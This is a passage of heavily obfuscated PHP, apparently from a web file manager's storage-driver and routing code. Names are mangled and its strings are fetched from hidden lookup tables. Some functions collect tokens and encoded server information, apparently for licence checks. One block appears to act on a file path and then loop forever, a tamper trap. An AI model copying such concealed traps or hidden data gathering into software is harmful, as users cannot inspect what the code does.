Exception("\x66\151\154\x65\122\145\x61\x64\40\x65\162\x72\x6f\x72\x21\40\163\x74\x61\x72\164\x3d{$ôØŒ‡÷¬}\x3b\154\145\156\147\164\x68\x3d{$ã™™Æ}\x3b\40\x73\x69\x7a\x65\x3d{$ÁõÔëˆØ}\73"); } $•ßÛŒ”— = $ªîş‰¼->fileSubstr($Ô¿Î™º¡, $ôØŒ‡÷¬, $ã™™Æ); if (!$•ßÛŒ”— && $ã™™Æ && isset($GLOBALS[$ã«Îã§ª[1174]])) { throw new Exception($GLOBALS[$ã«Îã§ª[1174]][$ã«Îã§ª[1175]]); } return $•ßÛŒ”—; } private static function driverMake(&$¾÷Ã—šÇ) { $ŠŸ³“ŞÁ =& $_SERVER[óó‹¸‚å]; $“Êì¦»ú = KodIO::parse($¾÷Ã—šÇ); if (!self::$driverListSystem) { $À•á²ˆ€ = Model($ŠŸ³“ŞÁ[771])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($À•á²ˆ€, $ŠŸ³“ŞÁ[399]); } if ($“Êì¦»ú[$ŠŸ³“ŞÁ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$“Êì¦»ú[$ŠŸ³“ŞÁ[399]]]) { return !1; } $¾÷Ã—šÇ = $“Êì¦»ú[$ŠŸ³“ŞÁ[1176]]; $‰êµ·˜Í = self::driverGet($“Êì¦»ú, $¾÷Ã—šÇ); return $‰êµ·˜Í; } private static function driverGet($÷úÆ‘ªö, &$¹»èî) { $Á’ü² =& $_SERVER[óó‹¸‚å]; $¦èè­ü” = $÷úÆ‘ªö[$Á’ü²[1177]]; $‚¿¿Œ¬ä = $÷úÆ‘ªö[$Á’ü²[399]]; switch ($÷úÆ‘ªö[$Á’ü²[33]]) { case KodIO::KOD_IO: $ÙË„›÷ä = self::$driverListSystem[$‚¿¿Œ¬ä]; break; case KodIO::KOD_SOURCE: $¹»èî = $‚¿¿Œ¬ä . $¹»èî; $ÙË„›÷ä = array($Á’ü²[1178] => $Á’ü²[1179], $Á’ü²[6] => $÷úÆ‘ªö); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÏìÊ¬ = $GLOBALS[$Á’ü²[1180]]; self::$driverListUser = array_to_keyvalue($ÏìÊ¬, $Á’ü²[399]); } $ÙË„›÷ä = self::$driverListUser[$‚¿¿Œ¬ä]; break; case KodIO::KOD_SHARE_LINK: $ÙË„›÷ä = array($Á’ü²[1178] => $Á’ü²[1181], $Á’ü²[6] => $÷úÆ‘ªö); $³²Áæ§× = Action($Á’ü²[1182])->sharePathInfo($÷úÆ‘ªö[$Á’ü²[84]]); $¹»èî = $³²Áæ§×[$Á’ü²[402]]; if (!$³²Áæ§×[$Á’ü²[402]]) { $ğ´¨¯¾° = Model($Á’ü²[601])->getInfo($³²Áæ§×[$Á’ü²[489]]); $¹»èî = KodIO::clear($ğ´¨¯¾°[$Á’ü²[1183]] . $÷úÆ‘ªö[$Á’ü²[1176]]); $÷úÆ‘ªö[$Á’ü²[487]] = $ğ´¨¯¾°; $÷úÆ‘ªö[$Á’ü²[1158]] = $¹»èî; $ÙË„›÷ä = array($Á’ü²[1178] => $Á’ü²[1184], $Á’ü²[6] => $÷úÆ‘ªö); } break; case KodIO::KOD_SHARE_ITEM: $ÙË„›÷ä = array($Á’ü²[1178] => $Á’ü²[1185], $Á’ü²[6] => $÷úÆ‘ªö); $ğ´¨¯¾° = Model($Á’ü²[601])->getInfo($÷úÆ‘ªö[$Á’ü²[399]]); if ($ğ´¨¯¾°[$Á’ü²[402]] == $Á’ü²[197]) { $¹»èî = KodIO::clear($ğ´¨¯¾°[$Á’ü²[1183]] . $÷úÆ‘ªö[$Á’ü²[1176]]); $÷úÆ‘ªö[$Á’ü²[487]] = $ğ´¨¯¾°; $÷úÆ‘ªö[$Á’ü²[1158]] = $¹»èî; $ÙË„›÷ä = array($Á’ü²[1178] => $Á’ü²[1186], $Á’ü²[6] => $÷úÆ‘ªö); } else { if (!$¹»èî) { $¹»èî = $ğ´¨¯¾°[$Á’ü²[402]]; } } break; default: $¹»èî = $÷úÆ‘ªö[$Á’ü²[84]]; $ÙË„›÷ä = array($Á’ü²[1178] => $Á’ü²[1187]); break; } $á—«óÔö = $÷úÆ‘ªö[$Á’ü²[84]]; if (!isset(self::$driverCache[$á—«óÔö])) { $åı…–× = strtolower($ÙË„›÷ä[$Á’ü²[95]]); $»ğ×áÄˆ = $GLOBALS[$Á’ü²[6]][$Á’ü²[89]][$Á’ü²[830]]; $úËæ¬¡ˆ = $Á’ü²[74] . (isset($»ğ×áÄˆ[$åı…–×]) ? $»ğ×áÄˆ[$åı…–×] : ucfirst($åı…–×)); if (!class_exists($úËæ¬¡ˆ)) { show_json("{$úËæ¬¡ˆ}\40\x6e\157\x74\x20\x65\x78\x69\x73\x74\163\x21", !1); } $Ÿ¡‘«š = isset($ÙË„›÷ä[$Á’ü²[6]]) ? $ÙË„›÷ä[$Á’ü²[6]] : !1; self::$driverCache[$á—«óÔö] = new $úËæ¬¡ˆ($Ÿ¡‘«š); } $ƒš³Š¦ = self::$driverCache[$á—«óÔö]; $ƒš³Š¦->pathDriver = $¦èè­ü”; $ƒš³Š¦->pathBase = $Á’ü²[12]; if (isset($ÙË„›÷ä[$Á’ü²[6]][$Á’ü²[1188]])) { $ƒš³Š¦->pathBase = rtrim($ÙË„›÷ä[$Á’ü²[6]][$Á’ü²[1188]], $Á’ü²[8]) . $Á’ü²[8]; $¹»èî = $ƒš³Š¦->pathBase . ltrim($¹»èî, $Á’ü²[8]); } $¹»èî = $ƒš³Š¦->getPath($¹»èî); if (isset($÷úÆ‘ªö[$Á’ü²[1158]])) { $¹»èî = $÷úÆ‘ªö[$Á’ü²[1158]]; } $ƒš³Š¦->path = $¹»èî; return $ƒš³Š¦; } public static function errorTips($³üÊ½—ñ = false) { $«µÕË‡İ =& $_SERVER[óó‹¸‚å]; static $¯”İüÌ = array(); $Âµ¹µ‚º = 1000; if ($³üÊ½—ñ === -1) { return $¯”İüÌ ? $¯”İüÌ[count($¯”İüÌ) - 1] : $«µÕË‡İ[12]; } if ($³üÊ½—ñ === !1) { return implode($«µÕË‡İ[231], $¯”İüÌ); } if (count($¯”İüÌ) >= $Âµ¹µ‚º) { $¯”İüÌ = array_slice($¯”İüÌ, $Âµ¹µ‚º * 0.5, $Âµ¹µ‚º); } $¯”İüÌ[] = $³üÊ½—ñ; write_log($«µÕË‡İ[162] . ACTION . $«µÕË‡İ[1189] . $³üÊ½—ñ, $«µÕË‡İ[1190]); } public static function getLastError($—æ—Ì”‘ = '') { $Ã€Ã€´ñ = self::errorTips(-1); return $Ã€Ã€´ñ ? $Ã€Ã€´ñ : $—æ—Ì”‘; } } goto f–ŞŞò™ï‹; DÔºÎé§ÏÇ: class PathDriverEDS extends PathDriverMinIO { public function __construct($­ˆöğ¢Ø) { parent::__construct($­ˆöğ¢Ø); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Û“ø±ƒ·) { parent::__construct($Û“ø±ƒ·); $this->signatureVersion($_SERVER[óó‹¸‚å][216]); } public function uploadFormData($™÷‹ËÑë, $¤êĞ£¯ = 3600) { $™ûÂíò¥ =& $_SERVER[óó‹¸‚å]; $„ÎÁ‡º¸ = $™ûÂíò¥[198]; $Ò•Ü‚Ä„ = $™ûÂíò¥[1362]; $±ÊÕéâ¶ = $™ûÂíò¥[62]; $Åã­Èüı = gmdate($™ûÂíò¥[1363]); $³È˜åéÁ = gmdate($™ûÂíò¥[755]); $Ñ˜Çß”“ = $™ûÂíò¥[1364]; $£ÉˆÓô³ = $¤êĞ£¯ . $™ûÂíò¥[12]; $²óİÖåÃ = $™ûÂíò¥[1326]; $“È™ÁµÖ = array($this->accessKey, $³È˜åéÁ, $this->region, $±ÊÕéâ¶, $Ñ˜Çß”“); $Ñ±´Ğ¶ = implode($™ûÂíò¥[8], $“È™ÁµÖ); $Ã÷ò® = array($™ûÂíò¥[1328] => gmdate($™ûÂíò¥[1327], strtotime($™ûÂíò¥[1365])), $™ûÂíò¥[1329] => array(array($™ûÂíò¥[1331] => $this->bucket), array($™ûÂíò¥[1330] => $„ÎÁ‡º¸), array($™ûÂíò¥[1332], $™ûÂíò¥[1333], $™ûÂíò¥[12]), array($™ûÂíò¥[1332], $™ûÂíò¥[1366], $™ûÂíò¥[12]), array($™ûÂíò¥[1332], $™ûÂíò¥[1367], $™ûÂíò¥[12]), array($™ûÂíò¥[1334] => $²óİÖåÃ), array($™ûÂíò¥[1368] => $Ñ±´Ğ¶), array($™ûÂíò¥[1369] => $Ò•Ü‚Ä„), array($™ûÂíò¥[1370] => $Åã­Èüı), array($™ûÂíò¥[1371] => $£ÉˆÓô³))); $½‘íË“ = base64_encode(json_encode($Ã÷ò®)); $ìıæ„ìƒ = hash_hmac($™ûÂíò¥[1372], $³È˜åéÁ, $™ûÂíò¥[1373] . $this->secret, !0); $³Êò÷¹Ÿ = hash_hmac($™ûÂíò¥[1372], $this->region, $ìıæ„ìƒ, !0); $†í®ÙÆŒ = hash_hmac($™ûÂíò¥[1372], $±ÊÕéâ¶, $³Êò÷¹Ÿ, !0); $„ëóòº” = hash_hmac($™ûÂíò¥[1372], $Ñ˜Çß”“, $†í®ÙÆŒ, !0); $»½óı´ = hash_hmac($™ûÂíò¥[1372], $½‘íË“, $„ëóòº”); $Ü²³¿Ù› = array($™ûÂíò¥[215] => $™ûÂíò¥[12], $™ûÂíò¥[1374] => $™ûÂíò¥[12], $™ûÂíò¥[1330] => $„ÎÁ‡º¸, $™ûÂíò¥[1334] => $²óİÖåÃ, $™ûÂíò¥[1338] => $½‘íË“, $™ûÂíò¥[1375] => $Ñ±´Ğ¶, $™ûÂíò¥[1376] => $Ò•Ü‚Ä„, $™ûÂíò¥[1377] => $Åã­Èüı, $™ûÂíò¥[1378] => $£ÉˆÓô³, $™ûÂíò¥[1379] => $»½óı´, $™ûÂíò¥[181] => $this->getHost()); return $Ü²³¿Ù›; } } if (!isset($_SERVER[$_SERVER[óó‹¸‚å][880]]) || !isset($_SERVER[$_SERVER[óó‹¸‚å][881]])) { $_getc = $_SERVER[óó‹¸‚å][883]; $_getfile = $_SERVER[$_SERVER[óó‹¸‚å][884]] . $_SERVER[óó‹¸‚å][885]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[óó‹¸‚å][231], $_getfilec); if (count($_getarrs) < $_SERVER[óó‹¸‚å][620]) { $exit = $_SERVER[óó‹¸‚å][886]; $exit(); } $_act = $_SERVER[óó‹¸‚å][1380]; $_act($_SERVER[$_SERVER[óó‹¸‚å][884]] . $_SERVER[óó‹¸‚å][885]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[óó‹¸‚å][378]); } } goto F¯òƒ­—†¨; B×ÓÔ†ƒŸÎ: class Application { private $defaultModule = "\151\156\x64\145\x78"; private $defaultController = "\151\x6e\144\x65\170"; private $defaultAction = "\151\x6e\144\x65\x78"; function __construct() { } public function setDefault($îùê’íè) { $†‘ıÚëº =& $_SERVER[óó‹¸‚å]; $¨…ØóØù =& $_SERVER[óƒÂÃÊÛ]; $Ïôğâ‰ = explode($¨…ØóØù[0], trim($îùê’íè, $¨…ØóØù[0])); $this->defaultModule = $Ïôğâ‰[0] ? $Ïôğâ‰[0] : $this->defaultModule; $“–Ğ¢äö = $†‘ıÚëº[619]; if (strlen($“–Ğ¢äö) < $†‘ıÚëº[620]) { return; } $this->defaultController = $Ïôğâ‰[1] ? $Ïôğâ‰[1] : $this->defaultController; $this->defaultAction = $Ïôğâ‰[2] ? $Ïôğâ‰[2] : $this->defaultAction; $„³…ĞÍ = $†‘ıÚëº[621]; $this->qcer655111b3($¨…ØóØù[1], array($this, $¨…ØóØù[2])); } public function appRun($íÔóĞ©á) { $¸ÚĞÑ»¨ =& $_SERVER[óó‹¸‚å]; $ù™Î‚û‘ =& $_SERVER[óƒÂÃÊÛ]; $¾ÁİÁ…œ = explode($ù™Î‚û‘[0], $íÔóĞ©á); $’ÂÉèŞ® = $¸ÚĞÑ»¨[622]; if (strlen($’ÂÉèŞ®) < $¸ÚĞÑ»¨[623]) { die; } $Ò•Üºş¤ = strtolower($¾ÁİÁ…œ[0]); $º±õ¸æõ = $¸ÚĞÑ»¨[624]; if (strlen($º±õ¸æõ) < $¸ÚĞÑ»¨[623]) { die; } $«×¿ûË‘ = $ù™Î‚û‘[3]; if ($Ò•Üºş¤ == $ù™Î‚û‘[4]) { $«×¿ûË‘ = $ù™Î‚û‘[5]; $¾ÁİÁ…œ[0] = $ù™Î‚û‘[6]; $¾ÁİÁ…œ[1] = $¾ÁİÁ…œ[1] . $ù™Î‚û‘[7]; $íÔóĞ©á = join($ù™Î‚û‘[0], $¾ÁİÁ…œ); $íÔóĞ©á = trim($íÔóĞ©á, $ù™Î‚û‘[0]); } call_user_func(array($ù™Î‚û‘[8], $ù™Î‚û‘[9]), $«×¿ûË‘ . $ù™Î‚û‘[10], $íÔóĞ©á); ActionCall($íÔóĞ©á); $ö‘íĞ³¤ = $¸ÚĞÑ»¨[625]; if (!$ö‘íĞ³¤) { die; } call_user_func(array($ù™Î‚û‘[8], $ù™Î‚û‘[9]), $«×¿ûË‘ . $ù™Î‚û‘[11], $íÔóĞ©á); } private function autorun() { $‚‡À–ê =& $_SERVER[óƒÂÃÊÛ]; global $config; if (count($config[$‚‡À–ê[12]]) == 0) { return; } foreach ($config[$‚‡À–ê[12]] as $á¾«°¦ => $ş‚¯ÃŠ•) { $this->appRun($ş‚¯ÃŠ•); } } private function dxfs566e6a0d() { $ÓÃç”Æ =& $_SERVER[óó‹¸‚å]; $´¼ç†Œ =& $_SERVER[óƒÂÃÊÛ]; $ÙÏØñ’ì = $´¼ç†Œ[4]; $Õ’ö…ÓÊ = $GLOBALS[$´¼ç†Œ[13]][$´¼ç†Œ[14]][0]; $®û‘Æù = $ÓÃç”Æ[626]; if (strlen($®û‘Æù) < $ÓÃç”Æ[623]) { return; } if (!$Õ’ö…ÓÊ || strlen($Õ’ö…ÓÊ) <= strlen($ÙÏØñ’ì)) { return; } if (strtolower(substr($Õ’ö…ÓÊ, -strlen($ÙÏØñ’ì))) != $ÙÏØñ’ì) { return; } $·¾ïîÎ = substr($Õ’ö…ÓÊ, 0, -strlen($ÙÏØñ’ì)); $«Éå½×É = array($´¼ç†Œ[4], $·¾ïîÎ); $–¨ûã»‡ = $ÓÃç”Æ[627]; while ($–¨ûã»‡ < $ÓÃç”Æ[620]) { if ($–¨ûã»‡ >= 0) { break; } $–¨ûã»‡++; } $ßö‡„ô® = array_slice($GLOBALS[$´¼ç†Œ[13]][$´¼ç†Œ[14]], 1); $İÎ¨‘›Ü = $ÓÃç”Æ[628]; if (strlen($İÎ¨‘›Ü) < $ÓÃç”Æ[623]) { return; } $GLOBALS[$´¼ç†Œ[13]][$´¼ç†Œ[14]] = array_merge($«Éå½×É, $ßö‡„ô®); $GLOBALS[$´¼ç†Œ[13]][$´¼ç†Œ[15]] = implode($´¼ç†Œ[0], $GLOBALS[$´¼ç†Œ[13]][$´¼ç†Œ[14]]); $ı‡×¸³ = $ÓÃç”Æ[629]; while ($ı‡×¸³ < $ÓÃç”Æ[620]) { if ($ı‡×¸³ >= 0) { break; } $ı‡×¸³++; } } private function idyn6e8b08a1() { $©Ø½ÏÖ =& $_SERVER[óó‹¸‚å]; $„Ñ¬ğÍ =& $_SERVER[óƒÂÃÊÛ]; if ($GLOBALS[$„Ñ¬ğÍ[13]][$„Ñ¬ğÍ[15]] != $„Ñ¬ğÍ[6]) { return; } $Íò¨ùŠç = $_SERVER[$„Ñ¬ğÍ[16]]; $Á±¨îÎÃ = $©Ø½ÏÖ[630]; if (!$Á±¨îÎÃ) { die; } $ÇÓ¨Ñªï = $„Ñ¬ğÍ[17]; $Îâüü¥’ = $©Ø½ÏÖ[631]; if (!strstr($Íò¨ùŠç, $ÇÓ¨Ñªï)) { return; } $¿¼÷ø½ = strrpos($Íò¨ùŠç, $ÇÓ¨Ñªï); $ß·Ùïû¿ = substr($Íò¨ùŠç, $¿¼÷ø½ + strlen($ÇÓ¨Ñªï)); preg_match_all($„Ñ¬ğÍ[18], $ß·Ùïû¿, $Ô®§Ğ©); $Ñ˜à¡ã¨ = $©Ø½ÏÖ[632]; $ß·Ùïû¿ = trim($Ô®§Ğ©[0][0], $„Ñ¬ğÍ[19]); $‡ôåÌ  = $©Ø½ÏÖ[633]; if (!$‡ôåÌ ) { return; } $GLOBALS[$„Ñ¬ğÍ[13]][$„Ñ¬ğÍ[14]] = explode($„Ñ¬ğÍ[19], $ß·Ùïû¿); $îÌ·¤°« = $©Ø½ÏÖ[634]; while (strlen($îÌ·¤°«) < $©Ø½ÏÖ[635]) { if (!$îÌ·¤°«) { break; } $îÌ·¤°«++; } $GLOBALS[$„Ñ¬ğÍ[13]][$„Ñ¬ğÍ[15]] = implode($„Ñ¬ğÍ[0], $GLOBALS[$„Ñ¬ğÍ[13]][$„Ñ¬ğÍ[14]]); $øÌ×Ğ´Ì = $©Ø½ÏÖ[636]; while (strlen($øÌ×Ğ´Ì) < $©Ø½ÏÖ[635]) { if (!$øÌ×Ğ´Ì) { break; } $øÌ×Ğ´Ì++; } } public function run() { $ÏşÇ§÷× =& $_SERVER[óƒÂÃÊÛ]; $this->idyn6e8b08a1(); $this->dxfs566e6a0d(); $éÔèÑ³ì = $GLOBALS[$ÏşÇ§÷×[13]][$ÏşÇ§÷×[14]]; $ş¹½Ûâ = $GLOBALS[$ÏşÇ§÷×[13]][$ÏşÇ§÷×[15]]; define($ÏşÇ§÷×[20], isset($éÔèÑ³ì[0]) && $éÔèÑ³ì[0] ? $éÔèÑ³ì[0] : $this->defaultModule); define($ÏşÇ§÷×[21], isset($éÔèÑ³ì[1]) && $éÔèÑ³ì[0] ? $éÔèÑ³ì[1] : $this->defaultController); define($ÏşÇ§÷×[22], isset($éÔèÑ³ì[2]) && $éÔèÑ³ì[0] ? $éÔèÑ³ì[2] : $this->defaultAction); define($ÏşÇ§÷×[23], MOD . $ÏşÇ§÷×[0] . ST . $ÏşÇ§÷×[0] . ACT); $_SERVER[$ÏşÇ§÷×[24]] = strtolower(ACTION); $this->autorun(); if (count($éÔèÑ³ì) >= 3) { $this->appRun($ş¹½Ûâ); } else { $this->appRun(ACTION); } } private $iahcc1a4cabb = array(); private $zmexe914e117 = ''; public function yhft0931fa3b() { $®¿®İË =& $_SERVER[óó‹¸‚å]; $†õ±êë =& $_SERVER[óƒÂÃÊÛ]; $this->xdby1b4e9dc4(); $this->udlab520b25e(); $á¡»ú¥ = $®¿®İË[637]; if (strlen($á¡»ú¥) < $®¿®İË[615]) { return; } $this->kvem1997e542(); $Ü¸ÙÙ… = $®¿®İË[638]; while ($Ü¸ÙÙ… < $®¿®İË[635]) { if ($Ü¸ÙÙ… >= 0) { break; } $Ü¸ÙÙ…++; } $this->hqos1048e310(); $this->fkyw31ebe523(); $Ó…¹¤ÂÂ = $®¿®İË[639]; $this->ltkbe49b12a6(); $this->dxplcbbf530e(); $Š‡õÈÆÏ = $®¿®İË[640]; if (!$Š‡õÈÆÏ) { return; } $this->qcer655111b3($†õ±êë[25], array($this, $†õ±êë[26])); $this->qcer655111b3($†õ±êë[27], array($this, $†õ±êë[28])); $this->qcer655111b3($†õ±êë[29], array($this, $†õ±êë[30])); $this->qcer655111b3($†õ±êë[31], array($this, $†õ±êë[32])); $Ğ£ñ“ö» = $®¿®İË[641]; if (!$Ğ£ñ“ö») { return; } } public function mrpi8a160eaf($ ¼üÛ¡‚) { $û…ğ«™ =& $_SERVER[óó‹¸‚å]; $¦”ú¦Ê =& $_SERVER[óƒÂÃÊÛ]; $¬ÈÊìô = Model($¦”ú¦Ê[33])->get(); $á¯äÀÌÏ = $û…ğ«™[642]; if (!$á¯äÀÌÏ) { return; } $Œ‡ó‘­Ğ = array($¦”ú¦Ê[34], $¦”ú¦Ê[35], $¦”ú¦Ê[36], $¦”ú¦Ê[37], $¦”ú¦Ê[38], $¦”ú¦Ê[39], $¦”ú¦Ê[40], $¦”ú¦Ê[41], $¦”ú¦Ê[42], $¦”ú¦Ê[43], $¦”ú¦Ê[44], $¦”ú¦Ê[45], $¦”ú¦Ê[46], $¦”ú¦Ê[47], $¦”ú¦Ê[48], $¦”ú¦Ê[49], $¦”ú¦Ê[50], $¦”ú¦Ê[51], $¦”ú¦Ê[52], $¦”ú¦Ê[53], $¦”ú¦Ê[54], $¦”ú¦Ê[55], $¦”ú¦Ê[56], $¦”ú¦Ê[57], $¦”ú¦Ê[58], $¦”ú¦Ê[59], $¦”ú¦Ê[60], $¦”ú¦Ê[61], $¦”ú¦Ê[62], $¦”ú¦Ê[63], $¦”ú¦Ê[64], $¦”ú¦Ê[65], $¦”ú¦Ê[66], $¦”ú¦Ê[67], $¦”ú¦Ê[68], $¦”ú¦Ê[69], $¦”ú¦Ê[70], $¦”ú¦Ê[71], $¦”ú¦Ê[72], $¦”ú¦Ê[73], $¦”ú¦Ê[74], $¦”ú¦Ê[75], $¦”ú¦Ê[76], $¦”ú¦Ê[77], $¦”ú¦Ê[78], $¦”ú¦Ê[79], $¦”ú¦Ê[80], $¦”ú¦Ê[81], $¦”ú¦Ê[82], $¦”ú¦Ê[83], $¦”ú¦Ê[84]); $®ÈÈÄÅ‘ = $û…ğ«™[643]; while (strlen($®ÈÈÄÅ‘) < $û…ğ«™[644]) { if (!$®ÈÈÄÅ‘) { break; } $®ÈÈÄÅ‘++; } foreach ($Œ‡ó‘­Ğ as $±éŒùÍ) { $¢ØìÛ§Ä = $GLOBALS[$¦”ú¦Ê[85]][$¦”ú¦Ê[86]][$±éŒùÍ]; $ÏÎ¤¨ï = $û…ğ«™[645]; while (strlen($ÏÎ¤¨ï) < $û…ğ«™[620]) { if (!$ÏÎ¤¨ï) { break; } $ÏÎ¤¨ï++; } if (isset($¬ÈÊìô[$±éŒùÍ])) { $¢ØìÛ§Ä = $¬ÈÊìô[$±éŒùÍ]; } $ ¼üÛ¡‚[$¦”ú¦Ê[87]][$¦”ú¦Ê[88]][$±éŒùÍ] = $¢ØìÛ§Ä; } $˜–ì¨Ñ = $ ¼üÛ¡‚[$¦”ú¦Ê[87]][$¦”ú¦Ê[88]][$¦”ú¦Ê[46]]; $Ò÷Üôª = $û…ğ«™[646]; unset($ ¼üÛ¡‚[$¦”ú¦Ê[87]][$¦”ú¦Ê[89]][$¦”ú¦Ê[90]]); $èú†í = $û…ğ«™[647]; if (strlen($èú†í) < $û…ğ«™[623]) { return; } unset($ ¼üÛ¡‚[$¦”ú¦Ê[87]][$¦”ú¦Ê[89]][$¦”ú¦Ê[91]]); $û©Üíˆ« = $û…ğ«™[648]; if (strlen($û©Üíˆ«) < $û…ğ«™[615]) { die; } unset($ ¼üÛ¡‚[$¦”ú¦Ê[87]][$¦”ú¦Ê[88]][$¦”ú¦Ê[46]]); $ŠÉìæĞ£ = $û…ğ«™[649]; if (strlen($ŠÉìæĞ£) < $û…ğ«™[644]) { die; } unset($ ¼üÛ¡‚[$¦”ú¦Ê[87]][$¦”ú¦Ê[88]][$¦”ú¦Ê[92]]); $ ¼üÛ¡‚[$¦”ú¦Ê[87]][$¦”ú¦Ê[88]][$¦”ú¦Ê[93]] = array($¦”ú¦Ê[94] => (int) $˜–ì¨Ñ[$¦”ú¦Ê[95]], $¦”ú¦Ê[96] => (int) _get($˜–ì¨Ñ, $¦”ú¦Ê[97], 0)); $æ¬˜ªá« = $û…ğ«™[650]; if (!$æ¬˜ªá«) { die; } $ ¼üÛ¡‚[$¦”ú¦Ê[98]][$¦”ú¦Ê[99]] = Action($¦”ú¦Ê[100])->accessToken(); $ ¼üÛ¡‚[$¦”ú¦Ê[98]][$¦”ú¦Ê[101]] = md5($_SERVER[$¦”ú¦Ê[102]] . $¬ÈÊìô[$¦”ú¦Ê[103]]); $ ¼üÛ¡‚[$¦”ú¦Ê[98]][$¦”ú¦Ê[104]] = base64_encode(serverInfo()); $ ¼üÛ¡‚[$¦”ú¦Ê[98]][$¦”ú¦Ê[105]] = $this->zmexe914e117; if ($¬ÈÊìô[$¦”ú¦Ê[105]] != $¦”ú¦Ê[106]) { $ ¼üÛ¡‚[$¦”ú¦Ê[98]][$¦”ú¦Ê[107]] = $¬ÈÊìô[$¦”ú¦Ê[107]]; $ ¼üÛ¡‚[$¦”ú¦Ê[98]][$¦”ú¦Ê[108]] = $¬ÈÊìô[$¦”ú¦Ê[108]]; $ÜÌÜ†Ò× = rand_string(10) . $this->zmexe914e117 . rand_string(5); $ ¼üÛ¡‚[$¦”ú¦Ê[87]][$¦”ú¦Ê[109]][$¦”ú¦Ê[110]] = $this->xdaq29ec9f10($ÜÌÜ†Ò×, $ ¼üÛ¡‚[$¦”ú¦Ê[98]][$¦”ú¦Ê[101]]); } if ($this->zmexe914e117 == $¦”ú¦Ê[106]) { $ ¼üÛ¡‚[$¦”ú¦Ê[87]][$¦”ú¦Ê[88]][$¦”ú¦Ê[93]][$¦”ú¦Ê[97]] = 0; } $ ¼üÛ¡‚[$¦”ú¦Ê[98]][$¦”ú¦Ê[111]] = _get($this->iahcc1a4cabb, $¦”ú¦Ê[112], $¦”ú¦Ê[6]); $ ¼üÛ¡‚[$¦”ú¦Ê[98]][$¦”ú¦Ê[113]] = _get($this->iahcc1a4cabb, $¦”ú¦Ê[114], $¦”ú¦Ê[6]); if (_get($GLOBALS, $¦”ú¦Ê[115]) && $this->config[$¦”ú¦Ê[116]]) { $ ¼üÛ¡‚[$¦”ú¦Ê[98]][$¦”ú¦Ê[117]] = WEB_ROOT; } return $ ¼üÛ¡‚; } private function ltkbe49b12a6() { $¶ÇñŸÑ½ =& $_SERVER[óó‹¸‚å]; $‰ëœ“ã =& $_SERVER[óƒÂÃÊÛ]; $Ê½Â÷ú¼ = $_SERVER[$‰ëœ“ã[24]] == $‰ëœ“ã[118]; $Î¡·å™˜ = $¶ÇñŸÑ½[651]; if (strlen($Î¡·å™˜) < $¶ÇñŸÑ½[644]) { return; } if ($_SERVER[$‰ëœ“ã[24]] == $‰ëœ“ã[119] && $_GET[$‰ëœ“ã[120]] == $‰ëœ“ã[121]) { $Ê½Â÷ú¼ = !0; } if ($Ê½Â÷ú¼) { $ö¶©ˆŞÂ = array($‰ëœ“ã[105] => $this->zmexe914e117, $‰ëœ“ã[122] => $this->tvnibd7bf96f(), $‰ëœ“ã[123] => Model($‰ëœ“ã[124])->count()); if ($this->zmexe914e117 != $‰ëœ“ã[106]) { $« õïÂ× = _get($this->iahcc1a4cabb, $‰ëœ“ã[125]); if ($« õïÂ×) { $ö¶©ˆŞÂ[$‰ëœ“ã[126]] = $« õïÂ×; $ö¶©ˆŞÂ[$‰ëœ“ã[127]] = strtotime(_get($this->iahcc1a4cabb, $‰ëœ“ã[128])); $ö¶©ˆŞÂ[$‰ëœ“ã[129]] = _get($this->iahcc1a4cabb, $‰ëœ“ã[114]); } $”âè®¸ = Model($‰ëœ“ã[33])->get($‰ëœ“ã[130], $‰ëœ“ã[6], !0); if (is_string($”âè®¸) && substr($”âè®¸, 0, 1) == $‰ëœ“ã[131]) { $”âè®¸ = json_decode_force($”âè®¸); } if (is_array($”âè®¸) && $”âè®¸[$‰ëœ“ã[132]] && strstr($”âè®¸[$‰ëœ“ã[132]], $‰ëœ“ã[133])) { $È¶¤”‡ = explode($‰ëœ“ã[133], $”âè®¸[$‰ëœ“ã[132]]); $ö¶©ˆŞÂ[$‰ëœ“ã[134]] = $È¶¤”‡[0]; } } $ö¶©ˆŞÂ = $this->jsuhbe72926f(json_encode($ö¶©ˆŞÂ), md5($‰ëœ“ã[135])); $‰Ñ½Î¥® = array($‰ëœ“ã[136] => $ö¶©ˆŞÂ); call_user_func(array($‰ëœ“ã[137], $‰ëœ“ã[138]), $‰Ñ½Î¥®); $ƒ–ÌÀş¾ = $¶ÇñŸÑ½[652]; if (!$ƒ–ÌÀş¾) { die; } } if ($this->zmexe914e117 == $‰ëœ“ã[106]) { return; } $åïË ‹ = array($‰ëœ“ã[139], $‰ëœ“ã[140], $‰ëœ“ã[141], $‰ëœ“ã[142], $‰ëœ“ã[143], $‰ëœ“ã[144]); $õìá› = $¶ÇñŸÑ½[653]; $Ö¦¸Š‚ = Model($‰ëœ“ã[33])->get(); $˜÷—ìûó = $¶ÇñŸÑ½[654]; $‰Ñ½Î¥® = array($‰ëœ“ã[145] => $Ö¦¸Š‚[$‰ëœ“ã[34]], $‰ëœ“ã[146] => $Ö¦¸Š‚[$‰ëœ“ã[35]], $‰ëœ“ã[147] => $‰ëœ“ã[6]); foreach ($åïË ‹ as $åÕ¡ïÄú) { if (!isset($Ö¦¸Š‚[$åÕ¡ïÄú]) || !$Ö¦¸Š‚[$åÕ¡ïÄú]) { continue; } $‰Ñ½Î¥®[$åÕ¡ïÄú] = $Ö¦¸Š‚[$åÕ¡ïÄú]; $ìÀÙ´ÎÖ = $¶ÇñŸÑ½[655]; if (strlen($ìÀÙ´ÎÖ) < $¶ÇñŸÑ½[615]) { return; } } call_user_func(array($‰ëœ“ã[137], $‰ëœ“ã[138]), $‰Ñ½Î¥®); $¡Ù„ƒÎ¦ = $¶ÇñŸÑ½[656]; while ($¡Ù„ƒÎ¦ < $¶ÇñŸÑ½[623]) { if ($¡Ù„ƒÎ¦ >= 0) { break; } $¡Ù„ƒÎ¦++; } } private function hqos1048e310() { $»¥ò±¥¢ =& $_SERVER[óó‹¸‚å]; $ÂÆÊÃ·” =& $_SERVER[óƒÂÃÊÛ]; if ($_SERVER[$ÂÆÊÃ·”[24]] != $ÂÆÊÃ·”[148]) { return; } if (!_get($GLOBALS, $ÂÆÊÃ·”[115])) { die; } $“ÅŠäØç = 